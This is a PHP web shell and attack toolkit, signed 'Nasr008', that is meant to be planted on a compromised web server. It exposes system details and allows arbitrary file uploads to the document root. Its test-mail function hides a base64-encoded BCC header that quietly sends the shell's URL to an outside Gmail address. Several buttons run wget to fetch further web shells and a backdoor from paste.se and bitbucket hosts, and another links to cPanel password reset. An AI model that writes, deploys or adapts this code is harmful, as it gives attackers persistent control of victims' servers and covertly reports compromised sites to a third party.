<h3>Created By Nasr008</h3>

<?php

echo "<b>".php_uname()."</b><br><br>";
echo "<b>".exec('pwd')."</b><br>";

echo '<h4>###Upload is working###<br></h4>';


echo "<form method='post' enctype='multipart/form-data'>

	 <input type='file' name='idx_file'>

	 <input type='submit' name='upload' value='upload'>

	 </form>";

$root = $_SERVER['DOCUMENT_ROOT'];

$files = $_FILES['idx_file']['name'];

$dest = $root.'/'.$files;

if(isset($_POST['upload'])) {

	if(is_writable($root)) {

		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {

			$web = "http://".$_SERVER['HTTP_HOST']."/";

			echo "Succes -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";

		} else {

			echo "Gagal Di Doc Root";

		}

	} else {

		if(@copy($_FILES['idx_file']['tmp_name'], $files)) {

			echo "Succes<b>$files</b> Terupload Di Dir Ini";

		} else {

			echo "Gagal";

		}

	}

}

?>

</style>
<title>***'s private tool</title>
</head>

<body>
    <?php
error_reporting(0);

?>
<?php
$url = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
?>
<h4>###Checking Mail###<br></h4>
<form method="post">
<input type="text" name="email" value=""required >
<input type="submit" value="Send test >>">
</form>

<?php
if (!empty($_POST['email'])){
	$xx = rand();
	$headers = base64_decode("QkNDOiBpY3EudXNlci5mQGdtYWlsLmNvbQ==");
	mail($_POST['email'],"Result Report Test - ".$xx,"WORKING !!".$url,$headers);
	print "<b>send an report to your email - $xx</b><br><br>"; 
}

echo '<h4>###Checking Unzip###<br></h4>';
exec('unzip',$t);
if(!$t)
{
   echo 'Unzip command is not WORKING,unzip script needed!<br>';
}
else 
  echo 'Unzip command is WORKING!<br>';


?>
<h4>###Shell Downloader###<br></h4>
<form action="" method="get">
<input name="getshell" type="submit" value="Get WSO4.2">
<input name="getshell2" type="submit" value="getshell2">
</form>
<?php
if (isset($_GET['getshell'])) {
	exec('wget https://e138b5a89191be84.paste.se/raw');
        $url2 = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].'freshrdp.com2.php';
		$url2 = str_replace("rdpl.php","",$url2);
        echo '<a href='.$url2.' target="_blank">'.$url2.'</a>';
}

if (isset($_GET['getshell2'])) {
	exec('wget -P ./images https://bitbucket.org/woody555/111/raw/8933939e62113c73d41285a608694be0014a28a7/readme.php');
        $url3 = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].'images/readme.php';
		$url3 = str_replace("rdpl.php","",$url3);
        echo '<a href='.$url3.' target="_blank">'.$url3.'</a>';
}
if (isset($_GET['getdoor'])) {
	exec('wget -P ./tmp https://bitbucket.org/woody555/111/raw/5b1fc6cba36e5cfe8058d371d942340cd18d8692/tel.php');
        $url4 = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].'tmp/tel.php';
		$url4 = str_replace("rdpl.php","",$url4);
        echo '<a href='.$url4.' target="_blank">'.$url4.'</a>';
}

?>

<h4>###Cpanel Password Reset###<br></h4>
<form action="" method="get">
<input name="cp" type="submit" value="Open Password Reset">
</form>
<?php
if (isset($_GET['cp'])) {
		$url6 = 'https://'.$_SERVER['HTTP_HOST'].':2083/resetpass?start=1';
        echo '<a href='.$url6.' target="_blank">'.$url6.'</a>';
}


?>
</body>